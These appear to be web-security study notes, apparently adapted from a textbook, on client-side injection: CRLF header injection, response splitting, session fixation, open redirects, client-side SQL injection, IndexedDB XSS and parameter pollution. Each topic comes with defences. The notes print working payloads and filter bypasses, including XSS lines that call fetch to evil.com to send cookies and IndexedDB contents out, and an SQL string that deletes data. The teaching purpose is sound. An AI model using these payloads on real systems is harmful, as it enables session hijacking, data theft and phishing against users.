# **Other Client-Side Injection Attacks – Breakdown**

### **1. HTTP Header Injection**

**What’s Happening?**

* This vulnerability occurs when **user-supplied input** is inserted into HTTP response headers without proper sanitization.
* If the attacker can inject special characters like **Carriage Return (CR = `%0d`)** and **Line Feed (LF = `%0a`)**, they can create **new headers** or **manipulate the response body**.
* Affected headers often include:

  * **`Location:`** (used in redirects)
  * **`Set-Cookie:`**
  * Any custom HTTP header

---

**Example – Vulnerable Application:**

```http
GET /settings/12/Default.aspx?Language=English HTTP/1.1
Host: mdsec.net
```

**Server Response:**

```http
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
```

---

**Malicious Request – Injecting a New Header:**

```http
GET /settings/12/Default.aspx?Language=English%0d%0aFoo:+bar HTTP/1.1
Host: mdsec.net
```

**Injected Response:**

```http
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Foo: bar
```

Here, `%0d%0a` created a **newline** in the HTTP header, adding a new `Foo: bar` header.

---

**Real-World Impact:**

* Set arbitrary cookies for a victim’s browser.
* Perform HTTP Response Splitting.
* Redirect users without touching HTML.
* Inject arbitrary HTML or scripts.

---

**Payloads & Bypasses:**

```
%0d%0a                → CRLF injection
%00%0d%0a              → Null byte + CRLF
%250d%250a             → Double-encoded CRLF
%%0d0d%%0a0a           → Encoding obfuscation
```

---

**Detection Steps (HACK STEPS):**

1. Identify points where your input appears in response headers.
2. Inject `%0d%0a` and check if the server includes new lines in headers.
3. Test with both CR and LF individually if needed.
4. If blocked, try bypass payloads above.
5. Always view **raw HTTP headers** in an intercepting proxy (Burp, OWASP ZAP) — HTML views will hide them.

---

### **2. Injecting Cookies**

**How It Works:**

* If you control part of a `Set-Cookie:` header, you can create your own cookies in the victim’s browser.
* Malicious cookies can persist across sessions if not marked as `Session` only.

---

**Example – Setting a Fake Session ID:**

```http
GET /settings/12/Default.aspx?Language=English%0d%0aSet-Cookie:+SessId=120a12f98e8 HTTP/1.1
Host: mdsec.net
```

**Response:**

```http
HTTP/1.1 200 OK
Set-Cookie: PreferredLanguage=English
Set-Cookie: SessId=120a12f98e8
```

Now, any victim who clicks this malicious link gets a **forged session cookie**.

---

**Delivery Mechanisms:**
Same as XSS — send via:

* Email phishing link
* Malicious third-party site
* Shortened URLs

---

### **3. HTTP Response Splitting**

**What’s Happening?**

* Advanced exploitation of header injection.
* The attacker **injects an entire fake HTTP response** after the legitimate one.
* The proxy server sees **two responses** and may cache the second one for another user.
* This allows **cache poisoning** for all users behind that proxy.

---

**Simplified Flow:**

1. Find a header injection vulnerability.
2. Inject CRLFs and specify a **Content-Length** to control where the first response ends.
3. Add a **second HTTP response** containing malicious HTML (e.g., fake login form).
4. Send both responses in one TCP connection (**HTTP pipelining**).
5. Proxy caches attacker’s fake page for a legitimate URL (e.g., `/admin`).
6. Victims visiting `/admin` get the attacker’s page.

---

**Payload Example – Splitting a Response:**

```http
GET /settings/12/Default.aspx?Language=English%0d%0aContent-Length:+22
%0d%0a%0d%0a<html>%0d%0afoo%0d%0a</html>%0d%0aHTTP/1.1+200+OK%0d%0a
Content-Length:+2307%0d%0a%0d%0a<html><head><title>Admin login</title>
```

* `%0d%0aContent-Length:+22` → Ends first response after 22 bytes.
* Everything after becomes **Response #2**.
* Cached malicious HTML replaces legitimate content.

---

**Impact of Response Splitting:**

* Proxy cache poisoning
* Phishing inside trusted domains
* Malicious script injection
* Arbitrary redirection

---

### **4. Prevention Techniques**

**Best Practices:**

1. **Avoid placing user input into headers** unless absolutely necessary.
2. **Input validation**:

   * Context-aware filtering
   * Restrict to safe characters (`[A-Za-z0-9]`)
   * Limit length
3. **Output sanitization**:

   * Strip characters with ASCII `< 0x20` (control characters like CR and LF)
4. **Force HTTPS**:

   * Prevents cache poisoning on intermediaries
   * Avoids manipulation via non-secure proxies

---

✅ **Key Takeaways for Testing:**

* Always test both normal and double encoding (`%250d%250a`).
* Inspect raw HTTP responses in Burp/ZAP — never rely on rendered HTML.
* Test all HTTP headers, not just `Location` and `Set-Cookie`.
* Try bypasses for CRLF filters.

---

## **1. Cookie Injection**

**Definition:**
Cookie Injection is when an attacker forces a victim’s browser to store a cookie with arbitrary values. This can be used to manipulate application logic, bypass security mechanisms, or plant malicious data.

---

### **How It Works (Step-by-Step)**

1. **Attacker finds a way to set a cookie in the victim's browser.**

   * Could be via **application features** (e.g., "Remember Theme" functionality).
   * Could be via **HTTP Header Injection** to insert a `Set-Cookie` header.
   * Could be via **XSS** on a related domain or subdomain.
   * Could be via **MITM attack** (on public Wi-Fi).

2. **Victim's browser saves the cookie.**

   * Browsers follow rules: if a cookie's domain matches, it’s sent with every request.

3. **Application trusts that cookie.**

   * If application logic assumes the cookie is valid and from itself, it can be abused.

---

### **Real-World Example**

**Scenario:**
A site stores a cookie to remember whether to force HTTPS:

```http
Set-Cookie: UseHttps=true; Path=/; Domain=example.com
```

**Attack via Header Injection:**
If the site is vulnerable:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: UseHttps=false; Path=/; Domain=example.com
```

Now the victim’s browser might start making **HTTP** requests, exposing them to downgrade + MITM attacks.

---

### **Exploitation Possibilities**

1. **Logic Manipulation**

   * Example: Setting `admin=true` cookie if the app doesn’t validate it.

2. **DOM-Based XSS / JS Injection**

   * If JavaScript reads cookies and injects them into HTML without sanitizing.

3. **Bypassing Anti-CSRF Mechanisms**

   * If the CSRF token is both in cookie and request parameter, attacker sets both.

4. **Forcing Session Tokens**

   * Directly set attacker’s session token in victim’s browser → Session Fixation.

---

### **Example Payloads**

#### **1. HTTP Header Injection**

```http
GET /profile?lang=en%0d%0aSet-Cookie:%20admin=true HTTP/1.1
Host: vulnerable.com
```

* `%0d%0a` = newline, starting a new header (`Set-Cookie`).

#### **2. XSS Cookie Set**

```javascript
document.cookie = "admin=true; path=/; domain=example.com";
```

#### **3. MITM Cookie Injection**

With control over network traffic:

```http
HTTP/1.1 200 OK
Set-Cookie: csrfToken=attackerToken; Path=/; Domain=bank.com
```

---

### **Defense**

* Only allow server-side setting of cookies, not via user input.
* Use `HttpOnly` and `Secure` flags.
* Validate all cookie values server-side.
* Restrict `Domain` and `Path` scope.

---

## **2. Session Fixation**

**Definition:**
Instead of stealing a user’s active session ID, attacker **plants** a session ID in victim’s browser **before** they log in, then uses the same ID afterward.

---

### **How It Works (Step-by-Step)**

1. **Attacker obtains a valid session token.**

   * E.g., visiting `/login.php` gives:

     ```
     Set-Cookie: PHPSESSID=abcd1234;
     ```

2. **Attacker delivers this token to the victim.**

   * Could be via cookie injection, a crafted URL, or CSRF into hidden fields.

3. **Victim logs in using attacker’s session token.**

   * Application “upgrades” the existing anonymous session to an authenticated one.

4. **Attacker now uses that same token to hijack session.**

---

### **Example Attack Flow**

#### **Step 1: Get Token**

```http
GET /login.php HTTP/1.1
Host: target.com
```

Response:

```http
Set-Cookie: SESSIONID=12345
```

#### **Step 2: Fix Token in Victim’s Browser**

Via link:

```
https://target.com/login.php;jsessionid=12345
```

Or via Cookie Injection:

```javascript
document.cookie = "SESSIONID=12345; path=/; domain=target.com";
```

#### **Step 3: Victim Logs In**

Victim’s browser already has SESSIONID=12345.
Server just upgrades the session → attacker now has access.

---

### **Extra Example – Non-Login Scenario**

If a shopping cart app uses anonymous session IDs:

1. Attacker sends victim a token link:

   ```
   https://shop.com/cart;jsessionid=abcd1234
   ```
2. Victim adds items & enters payment details.
3. Attacker uses same session to view `Confirm Order`.

---

### **Exploitation Payload Examples**

**CSRF Injection into Hidden Field:**

```html
<form action="https://target.com/login" method="POST">
  <input type="hidden" name="SESSIONID" value="12345">
  <input type="text" name="username" value="victim">
  <input type="password" name="password" value="password123">
</form>
```

---

### **Defense**

* Always issue a **new session ID after login** or privilege escalation.
* Reject session IDs not generated by the server.
* Use per-request or per-page tokens in sensitive flows.

---

### **HACK STEPS Checklist**

#### **For Cookie Injection**

1. Look for features that set cookies via user input.
2. Attempt HTTP header injection to add `Set-Cookie`.
3. Test XSS on subdomains to set cookies for the parent domain.
4. Test if setting malicious cookies changes app behavior.

#### **For Session Fixation**

1. Obtain a valid session ID.
2. Inject it into victim’s browser.
3. Wait for victim to log in.
4. Use same session to impersonate victim.

---

## **Open Redirection Vulnerabilities**

### **1. Definition & Purpose**

* **What it is:**
  Occurs when an application uses **user-controlled input** to redirect a browser to a new URL.
* **Why attackers use it:**

  * Mostly for **phishing** — makes malicious links look legitimate by starting with a trusted domain.
  * Can trick victims into visiting a spoofed site where they enter sensitive data.
  * Sometimes used for harmless pranks (e.g., *rickrolling*).

---

### **2. How It Works**

Applications can redirect using multiple methods:

1. **HTTP Redirect** (3xx status code + `Location` header)
2. **HTTP Refresh Header** (`Refresh: 0; url=...`)
3. **HTML `<meta>` refresh tag**
4. **JavaScript APIs**:

   * `document.location`
   * `window.location.href`
   * `window.navigate()`
   * `window.open()`
     *(And others that can set or change the page location.)*

Both **absolute** and **relative** URLs may be used.

---

### **3. Finding Vulnerabilities**

**Steps to Identify**

1. Find **all redirects** in the application.
2. Use an **intercepting proxy** to:

   * Browse the app
   * Identify navigation events that cause multiple requests in sequence.
3. Check if **user input controls the target URL**:

   * If **fixed**, no vulnerability.
   * If **user-controllable**, test for exploitation.

**Key Indicators of Vulnerability**

* Redirect parameter accepts:

  * Absolute URLs → try changing domain to attacker-controlled.
  * Relative URLs → try converting to absolute external URLs.
* Example of vulnerable behavior:

  ```
  GET /updates/8/?redir=http://mdattacker.net/
  HTTP/1.1 302 Object moved
  Location: http://mdattacker.net/
  ```

---

### **4. Bypassing Common Defenses**

#### **A. Blocking Absolute URLs**

* App may reject if value starts with `http://`.
  Bypasses include:

  ```
  HtTp://mdattacker.net
  %00http://mdattacker.net
   http://mdattacker.net
  //mdattacker.net
  %68%74%74%70%3a%2f%2fmdattacker.net
  https://mdattacker.net
  http:\\mdattacker.net
  http:///mdattacker.net
  ```

#### **B. Sanitizing Absolute URLs**

* App removes `http://` or strips external domains.
* Bypass with:

  ```
  http://http://mdattacker.net
  http://mdattacker.net/http://mdattacker.net
  hthttp://tp://mdattacker.net
  ```

#### **C. Domain Validation Bypass**

* App checks for its own domain but poorly.
* Bypass with:

  ```
  http://mdsec.net.mdattacker.net
  http://mdattacker.net/?http://mdsec.net
  http://mdattacker.net/%23http://mdsec.net
  ```

#### **D. Absolute Prefix Addition**

* App appends user input to a fixed prefix:

  ```
  http://mdsec.net + .mdattacker.net
  → http://mdsec.net.mdattacker.net (attacker-controlled)
  ```

---

### **5. Client-Side Redirect Vulnerabilities**

If done in **JavaScript** using DOM data:

* All code and validation is visible client-side.
* Check:

  * How user input is incorporated into the redirect.
  * If validation exists and can be bypassed.
* Risk is similar to **DOM-based XSS**.

---

### **6. Prevention**

**Best Practice:**
Avoid using user-controlled input in redirect targets.

If unavoidable:

1. **Remove redirect pages**; use direct links.
2. **Whitelist approach** — store allowed destinations and use index-based lookups.
3. **Strict URL validation:**

   * If using relative URLs → ensure format matches a safe pattern (e.g., `/page` or `page`, no `:` before `/`).
   * If using absolute URLs → verify they start with your domain name exactly.
4. **Prepend domain server-side** for all redirects.
5. Avoid client-side DOM-based redirects.

---

## **Client-Side SQL Injection (C-SQLi) — Explained**

### **1. What is this?**

When HTML5 introduced the `Web SQL Database` API, browsers allowed web apps to store data locally in a **SQL-like database** using JavaScript.
Think of it like having a **mini SQLite** running inside your browser for that site.

Example from the section:

```javascript
var db = openDatabase('contactsdb', '1.0', 'WahhMail contacts', 1000000);
db.transaction(function (tx) {
  tx.executeSql('CREATE TABLE IF NOT EXISTS contacts (id unique, name, email)');
  tx.executeSql('INSERT INTO contacts (id, name, email) VALUES (1, "Matthew Adamson", "madam@nucnt.com")');
});
```

The **problem**?
If the app **inserts attacker-controlled input directly into SQL statements without sanitization**, you can perform **SQL Injection** — just like on the server — but **inside the victim’s browser**.

---

### **2. Why this exists**

* Web apps want offline mode (think Gmail Offline, news readers, social apps).
* They store user data (contacts, messages, articles) locally in a **Web SQL database**.
* If the developer **dynamically builds SQL queries with user data** (e.g., from emails, chat messages, comments) **without escaping**, the same classic injection attack applies.

---

### **3. Where it can happen**

The section lists **three common scenarios**:

1. **Social networking apps** → storing contact names, bios, or statuses locally.
2. **News apps** → storing articles + user comments for offline reading.
3. **Webmail apps** → storing incoming + outgoing emails locally.

---

### **4. Example attack flow**

Let’s use the **webmail scenario** from the book.

#### **Step-by-step**

1. Attacker sends you an email with this **malicious subject line**:

   ```sql
   '); SELECT email,body FROM messages; --
   ```
2. The webmail app **stores that subject** into its local Web SQL database.
3. Later, the app builds another SQL query to process/display that subject:

   ```javascript
   tx.executeSql("INSERT INTO inbox (subject, body) VALUES ('" + subject + "', '" + body + "')");
   ```
4. The injected `SELECT` runs **inside your browser’s local DB**.
5. It fetches all your stored messages, including private ones.
6. The attacker might also **insert their own rows** into the “outbox” table, queuing an email to themselves with all your stolen data.

---

### **5. Why this is dangerous**

* **Same impact as server-side SQL injection**, but **without hitting the server**.
* Attacker can:

  * Steal your locally stored data.
  * Tamper with offline content.
  * Queue actions (e.g., send emails, modify contacts) that will sync when you go online.
* Works even if you’re offline at the moment of injection.

---

### **6. Real-world parallel**

Think of it like a malicious spreadsheet formula in Excel — it’s all running **on your machine**, not the company server.
It doesn't matter that it’s “local” — your local DB may contain sensitive emails, chat logs, or authentication tokens.

---

### **7. How this might slip past developers**

* Developers **assume local = safe**.
* They may rely on normal “usability testing” to find bugs, but since SQL metacharacters (like `'`) might appear naturally in names (e.g., *O'Connor*), they already have to handle escaping — yet their filters can still have bypasses.
* If their filter works in most cases, they feel secure — until someone sends a **crafted payload** that slips through.

---

### **8. Example payload**

Let’s say the app runs:

```javascript
tx.executeSql("INSERT INTO contacts (name, email) VALUES ('" + name + "', '" + email + "')");
```

If `name` =

```
Bob'); DELETE FROM contacts; --
```

It becomes:

```sql
INSERT INTO contacts (name, email) VALUES ('Bob'); DELETE FROM contacts; --', 'attacker@example.com')
```

Result: All your contacts vanish.

---

### **9. Defenses**

The book hints at parallels with server-side defenses:

* **Parameterized queries** (`?` placeholders instead of string concatenation).
* **Proper escaping/encoding** before putting data in SQL queries.
* **Input validation** — even for local/offline data.
* **Sanitizing before storage** (not just before display).
* **Avoid Web SQL entirely** → modern browsers encourage IndexedDB (structured storage, not SQL).

---

## **Practice Questions**

1. In the webmail example, how could an attacker send themselves your stored offline messages without directly accessing your machine?
2. Why might a developer wrongly assume client-side SQL injection isn’t a real threat?
3. Give two differences between server-side SQLi and client-side SQLi in terms of attack surface and limitations.
4. How could you bypass naive escaping that only replaces `'` with `\'` in Web SQL?
5. Why might SQL injection vulnerabilities still exist in client-side databases even after initial usability testing?

---

## **Attacking Client-Side IndexedDB Applications**

### **What’s IndexedDB?**

* IndexedDB is a client-side database in browsers.
* Instead of SQL, it uses object stores and indexes — you interact with it via JavaScript APIs.
* Example:

```js
const request = indexedDB.open("AppDB", 1);
```

* Because it’s key-value/object-based, you don’t build SQL strings.
  **BUT**: developers sometimes misuse it, introducing **client-side injection points**.

---

## **Where the Vulnerability Comes From**

IndexedDB itself is safe when used as intended — but **unsafe patterns** show up when developers:

1. **Serialize and deserialize untrusted input** (e.g., `JSON.parse()` with attacker-controlled data stored in IndexedDB).
2. **Use dangerous APIs like `eval()` or `Function()`** on stored strings.
3. **Mix dynamic HTML creation with IndexedDB data** (leading to DOM XSS from local storage).
4. **Implement custom query logic in JS** that concatenates filters or conditions from user input.

---

## **Example: Vulnerable Chat Application**

Imagine a chat app that stores offline messages in IndexedDB so users can read them without internet.

### **Client-side code**

```js
// Open the DB
const dbRequest = indexedDB.open("ChatApp", 1);

dbRequest.onupgradeneeded = (event) => {
    let db = event.target.result;
    db.createObjectStore("messages", { keyPath: "id" });
};

// Add a message
function saveMessage(user, text) {
    const db = dbRequest.result;
    const tx = db.transaction("messages", "readwrite");
    tx.objectStore("messages").add({
        id: Date.now(),
        user: user,
        text: text
    });
}

// Render messages
function renderMessages() {
    const db = dbRequest.result;
    const tx = db.transaction("messages", "readonly");
    const store = tx.objectStore("messages");

    store.getAll().onsuccess = (event) => {
        const messages = event.target.result;

        messages.forEach(msg => {
            // ❌ BAD: Directly inserting user input into HTML
            document.querySelector("#chat").innerHTML += `<p><b>${msg.user}</b>: ${msg.text}</p>`;
        });
    };
}
```

---

## **How the Attack Works**

An attacker could send a message containing HTML/JS payload:

```html
<img src=x onerror="fetch('https://evil.com/'+document.cookie)">
```

If this message gets stored in IndexedDB (from the attacker’s account) and then rendered **without sanitization**, the script will execute locally when the victim opens the chat — even offline.

**Impact**:

* Stealing stored session tokens or sensitive data from IndexedDB/localStorage.
* Running malicious actions in the context of the app.
* Persisting XSS offline — works even if victim loads app in airplane mode.

---

## **Real-World Payloads**

1. **Stealing IndexedDB contents**

```html
<img src=x onerror="
  indexedDB.open('ChatApp').onsuccess = e => {
    let db = e.target.result;
    let tx = db.transaction('messages', 'readonly');
    let store = tx.objectStore('messages');
    store.getAll().onsuccess = ev => {
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(ev.target.result)
      });
    };
  };
">
```

*(This reads all messages from the victim’s IndexedDB and sends them to attacker.)*

2. **Offline Persistent XSS**

```html
<script>alert('Owned, even offline!')</script>
```

*(This payload will run every time the app renders from IndexedDB, no internet needed.)*

---

## **Exploitation Flow**

1. Attacker sends malicious input into the app (via chat, form, or sync feature).
2. The app stores it in IndexedDB without sanitization.
3. Victim opens the app (online or offline).
4. The stored malicious code executes in victim’s browser context.

---

## **Defensive Measures**

* **Sanitize all output** when rendering from IndexedDB (`DOMPurify`, `textContent` instead of `innerHTML`).
* **Never `eval()` or dynamically execute stored strings**.
* Validate and escape all user input before storage.
* Use **Content Security Policy (CSP)** to block inline scripts.
* Treat IndexedDB data as **untrusted**, just like data from the server.

---

### **Why This Matters in 2025**

While SQL injection on the client side is dead, **persistent offline XSS via IndexedDB** is very much alive.
The pattern is:

> “User-controlled data → stored locally → rendered unsafely → code execution”

It’s not about SQL anymore — it’s about unsafe dynamic rendering.

---

## **Client-Side HTTP Parameter Pollution (HPP)**

### **What It Is**

HTTP Parameter Pollution is when you **inject extra parameters** into a request or link, either by:

* Appending additional parameters
* URL-encoding `&` or `=` to smuggle in new key-value pairs

On the client side, this happens **before the request is sent**, during the link-building phase of the web app.

---

### **Key Difference From Server-Side HPP**

* **Server-Side HPP:** Attacker sends a crafted request directly to the server to manipulate behavior.
* **Client-Side HPP:** Attacker makes the application itself generate malicious links with duplicated or unexpected parameters.
  This often bypasses **anti-CSRF tokens** because the malicious parameters get embedded into legit app-generated links.

---

## **Example Vulnerable Flow**

### **Normal App Behavior**

Inbox URL:

```
https://wahh-mail.com/show?folder=inbox&order=down&size=20&start=1
```

Reply link generated by app:

```html
<a href="doaction?folder=inbox&order=down&size=20&start=1&message=12&action=reply&rnd=1935612936174">
    reply
</a>
```

---

### **Injection Point**

The app **copies some URL parameters** from the inbox page’s query string into the action links without sanitizing them.

Attacker sends victim a crafted URL:

```
https://wahh-mail.com/show?folder=inbox&order=down&size=20&start=1%26action=delete
```

#### Why `%26`?

* `%26` is the URL-encoded form of `&`.
* When decoded by the server:

```
start=1&action=delete
```

* Now `action=delete` is embedded into the links.

---

### **Resulting Malicious Link**

Victim’s **reply** link now looks like:

```html
<a href="doaction?folder=inbox&order=down&size=20&start=1&action=delete&message=12&action=reply&rnd=1935612936174">
    reply
</a>
```

---

### **How the Attack Works**

* Browser clicks `reply` → sends `action=delete` **and** `action=reply`.
* If app takes **first value wins** approach, `action=delete` executes instead of reply.
* CSRF tokens (`rnd`) don’t help because they’re part of the legit flow — the app built the link itself.

---

## **Real-World Exploitation Scenarios**

1. **Delete on Reply**

   * Crafted URL injects `action=delete` into `reply` link.
2. **Forward on View**

   * Inject `action=forward&to=attacker@example.com` into message view link.
3. **Multiple Encodings**

   * `%2526` (double encoding) → server decodes twice → smuggle deeper injections.
4. **Chained Actions**

   * Inject `action=deleteAll` in inbox and `action=forward` in return-to-inbox link, so every navigation does damage.

---

### **Payload Examples**

1. Basic:

```
start=1%26action=delete
```

2. Multi-parameter injection:

```
start=1%26action=forward%26to=attacker@example.com
```

3. Double-encoded bypass:

```
start=1%2526action=delete
```

(First decode → `%26`, second decode → `&`)

---

### **Impact**

* Delete user emails without consent
* Forward confidential messages
* Trigger mailbox rules to auto-forward all new messages
* Bypass CSRF protection

---

## **Defenses**

* **Canonicalize parameters before use** (normalize to single value per key).
* **Strictly validate input** before embedding into links.
* Encode parameters using functions like `encodeURIComponent()` before link construction.
* Never trust values copied directly from `location.search` without sanitization.

---

### **Key Takeaway**

Client-side HPP works because:

1. The app mirrors query params into generated links.
2. Encoded `&` smuggles in extra params.
3. CSRF protections are bypassed because malicious links are generated by the trusted app.

---